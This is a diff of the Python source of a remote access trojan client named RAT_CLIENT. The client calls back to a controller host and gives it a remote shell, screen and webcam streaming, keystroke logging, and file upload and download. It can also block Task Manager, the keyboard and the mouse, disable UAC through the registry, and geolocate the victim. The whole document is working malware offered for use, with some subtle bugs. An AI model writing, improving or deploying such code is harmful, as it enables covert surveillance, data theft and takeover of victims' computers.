@@ -1,24 +1,28 @@
+import pyscreenshot
+import socket
+import random
 import subprocess
 import os
-import sys
-import random
-import socket
 import platform
-import ctypes
-import shutil
-import glob
-import urllib.request
-import json
-import pyautogui
-from pynput.keyboard import Listener
-import time
-import keyboard
 from threading import Thread
+from PIL import Image
+from datetime import datetime
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from winreg import *
-from vidstream import ScreenShareClient, CameraClient
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+import shutil
+import glob
+import ctypes
+import sys
+import webbrowser
+import re
+import pyautogui
+import cv2
+import urllib.request
+import json
+from pynput.keyboard import Listener
+import time
+import keyboard
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -45,20 +49,55 @@ class RAT_CLIENT:
         s.connect((self.host, self.port))
         sending = socket.gethostbyname(socket.gethostname())
         s.send(sending.encode())
-
+    
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
         for i in range(len(output)):
             output[i] ^= 0x41
         s.send(output)
+    
+    def keylogger(self):
+        def on_press(key):
+            if klgr == True:
+                with open('keylogs.txt', 'a') as f:
+                    f.write(f'{key}')
+                    f.close()
 
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+    
+    def block_task_manager(self):
+        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+            while (1):
+                if block == True:
+                    hwnd = user32.FindWindowW(0, "Task Manager")
+                    user32.ShowWindow(hwnd, 0)
+                    ctypes.windll.kernel32.Sleep(500)
+    
+    def disable_all(self):
+        while True:
+            user32.BlockInput(True)
+    
+    def disable_mouse(self):
+        mouse = Controller()
+        t_end = time.time() + 3600*24*11
+        while time.time() < t_end and mousedbl == True:
+            mouse.position = (0, 0)
+    
+    def disable_keyboard(self):
+        for i in range(150):
+            if kbrd == True:
+                keyboard.block_key(i)
+        time.sleep(999999)
+    
     def execute(self):
         while True:
             command = s.recv(1024).decode()
+            
             if command == 'shell':
                 while 1:
                     command = s.recv(1024).decode()
-                    if command.lower() == 'exit':
+                    if command.lower() == 'exit' :
                         break
                     if command == 'cd':
                         os.chdir(command[3:].decode('utf-8'))
@@ -72,6 +111,7 @@ class RAT_CLIENT:
             
             elif command == 'screenshare':
                 try:
+                    from vidstream import ScreenShareClient
                     screen = ScreenShareClient(self.host, 8080)
                     screen.start_stream()
                 except:
@@ -79,6 +119,7 @@ class RAT_CLIENT:
             
             elif command == 'webcam':
                 try:
+                    from vidstream import CameraClient
                     cam = CameraClient(self.host, 8080)
                     cam.start_stream()
                 except:
@@ -168,6 +209,7 @@ class RAT_CLIENT:
             
             elif command == 'volumeup':
                 try:
+                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                     devices = AudioUtilities.GetSpeakers()
                     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                     volume = cast(interface, POINTER(IAudioEndpointVolume))
@@ -180,6 +222,7 @@ class RAT_CLIENT:
             
             elif command == 'volumedown':
                 try:
+                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                     devices = AudioUtilities.GetSpeakers()
                     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                     volume = cast(interface, POINTER(IAudioEndpointVolume))
@@ -285,10 +328,14 @@ User: {os.getlogin()}
                 s.send("Keyboard and mouse are disabled".encode())
             
             elif command.startswith("disable") and command.endswith("--keyboard"):
+                global kbrd
+                kbrd = True
                 Thread(target=self.disable_keyboard, daemon=True).start()
                 s.send("Keyboard is disabled".encode())
             
             elif command.startswith("disable") and command.endswith("--mouse"):
+                global mousedbl
+                mousedbl = True
                 Thread(target=self.disable_mouse, daemon=True).start()
                 s.send("Mouse is disabled".encode())
             
@@ -296,9 +343,11 @@ User: {os.getlogin()}
                 os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
             
             elif command.startswith("enable") and command.endswith("--keyboard"):
+                kbrd = False
                 s.send("Mouse and keyboard are unblocked".encode())
             
             elif command.startswith("enable") and command.endswith("--mouse"):
+                mousedbl = False
                 s.send("Mouse is enabled".encode())
 
             elif command.startswith("enable") and command.endswith("--all"):
@@ -327,6 +376,8 @@ User: {os.getlogin()}
                     s.send(sending.encode())
 
             elif command == 'keyscan_start':
+                global klgr
+                klgr = True
                 kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
                 FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                 None, CREATE_ALWAYS , 0, 0)
@@ -344,6 +395,7 @@ User: {os.getlogin()}
                     self.errorsend()
             
             elif command == 'stop_keylogger':
+                klgr = False
                 s.send("The session of keylogger is terminated".encode())
             
             elif command == 'cpu_cores':
@@ -453,98 +505,89 @@ User: {os.getlogin()}
                 s.send()
             
             elif command == 'disabletaskmgr':
+                global block
+                block = True
                 Thread(target=self.block_task_manager, daemon=True).start()
-                s.send("Task Manager is disabled".encode())
+                s.send('Task Manager is blocked'.encode())
             
             elif command == 'enabletaskmgr':
-                s.send("Task Manager is enabled".encode())
+                block = False
+                s.send('Task Manager is enabled'.encode())
+
+            elif command == 'cdesktop':
+                desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+                os.chdir(desktop)
+                curdir = str(os.getcwd())
+                s.send(curdir.encode())
             
-            elif command == 'localtime':
-                now = datetime.now()
-                current_time = now.strftime("%H:%M:%S")
-                s.send(str(current_time).encode())
+            elif command == 'camshot':
+                camera = cv2.VideoCapture(0)
+                ret, frame = camera.read()
+                if ret:
+                    cv2.imwrite("camshot.png", frame)
+                    camera.release()
+                    s.send("Screenshot was saved".encode())
+                else:
+                    s.send("Failed to take screenshot".encode())
             
-            elif command[:9] == 'startfile':
+            elif command[:6] == 'upload':
                 try:
-                    s.send(f'{command[10:]} was started'.encode())
-                    os.startfile(command[10:])
+                    filename = command[7:]
+                    filesize = int(s.recv(1024).decode())
+                    with open(filename, "wb") as f:
+                        data = s.recv(1024)
+                        totalRecv = len(data)
+                        f.write(data)
+                        while totalRecv < filesize:
+                            data = s.recv(1024)
+                            totalRecv += len(data)
+                            f.write(data)
+                    s.send(f"{filename} was uploaded".encode())
                 except:
                     self.errorsend()
-
+            
             elif command[:8] == 'download':
+                filename = command[9:]
                 try:
-                    file = open(command.split(" ")[1], 'rb')
-                    data = file.read()
-                    s.send(data)
+                    with open(filename, "rb") as f:
+                        bytesToSend = f.read(1024)
+                        s.send(bytesToSend)
+                        while bytesToSend != "":
+                            bytesToSend = f.read(1024)
+                            s.send(bytesToSend)
+                    s.send("Download completed".encode())
                 except:
-                    self.errorsend()
-
-            elif command == 'upload':
-                filename = s.recv(6000)
-                newfile = open(filename, 'wb')
-                data = s.recv(6000)
-                newfile.write(data)
-                newfile.close()
+                    s.send("Download failed".encode())
             
-            elif command[:5] == 'mkdir':
+            elif command == 'website':
+                link = s.recv(6000).decode()
                 try:
-                    os.mkdir(command[6:])
-                    s.send(f'Directory {command[6:]} was created'.encode())
+                    webbrowser.open(link)
+                    s.send(f"Opened {link}".encode())
                 except:
                     self.errorsend()
+            
+            elif command == 'geolocate':
+                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
+                    data = json.loads(url.read().decode())
+                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
+                s.send(link.encode())
+            
+            elif command == 'exit':
+                s.close()
+                exit()
+    
+    def run(self):
+        self.build_connection()
+        self.execute()
 
-            elif command == 'help':
-                helpinfo = '''
-shell - open command prompt
-dir - shows files in directory
-cd [directory] - change directory
-cd .. - go back one directory
-pwd - shows the current directory
-createfile [filename] - create file in directory
-editfile [filename] [text] - add text to file
-delfile [filename] - delete file in directory
-startfile [filename] - start file in directory
-readfile [filename] - read file in directory
-abspath [filename] - get absolute path of file
-ipconfig - shows ip configuration
-localtime - shows local time
-tasklist - shows all running tasks
-kill [taskname] - terminate task by name
-shutdown - shutdown the system
-'''
-                s.send(helpinfo.encode())
+# Define global variables
+s = None
+block = False
+kbrd = False
+mousedbl = False
+klgr = False
 
-            else:
-                output = subprocess.getoutput(command)
-                s.send(output.encode())
-                if not output:
-                    self.errorsend()
-
-    def keylogger(self):
-        with Listener(on_press=self.on_press) as listener:
-            listener.join()
-
-    def on_press(self, key):
-        try:
-            f = open("keylogs.txt", 'a')
-            f.write(str(key))
-            f.close()
-        except:
-            pass
-
-    def block_task_manager(self):
-        ctypes.windll.user32.MessageBoxW(0, "Task Manager has been disabled by your administrator.", "Warning", 0x00000000 | 0x00000040)
-
-    def disable_keyboard(self):
-        user32.BlockInput(True)
-
-    def disable_mouse(self):
-        user32.mouse_event(0x0001, 0, 0, 0, 0)
-
-    def disable_all(self):
-        user32.BlockInput(True)
-        user32.mouse_event(0x0001, 0, 0, 0, 0)
-
-client = RAT_CLIENT('Changeme', Changeme)
-client.build_connection()
-client.execute()
+# Run the RAT client
+client = RAT_CLIENT("changeme", changeme)  # Change to your IP and port
+client.run()
